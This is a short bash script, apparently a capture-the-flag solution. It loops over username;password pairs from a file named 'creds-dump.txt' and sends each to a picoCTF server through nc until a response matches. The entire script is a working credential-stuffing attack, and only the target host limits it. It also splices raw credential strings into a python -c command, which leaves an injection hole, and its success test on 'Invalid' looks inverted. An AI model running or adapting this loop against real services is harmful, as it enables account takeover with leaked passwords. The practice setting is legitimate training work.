#!/bin/bash

while IFS= read -r line; do
    arr=(${line//;/ })
    username=${arr[0]}
    password=${arr[1]}
    echo "Trying $username:$password"
    output=$(python3 -c "print('$username\n$password')" | nc crystal-peak.picoctf.net 57193)
    if [[ "$output" =~ .Invalid. ]]; then
        echo "Found!"
        echo $output
        break
    fi
done < "creds-dump.txt"
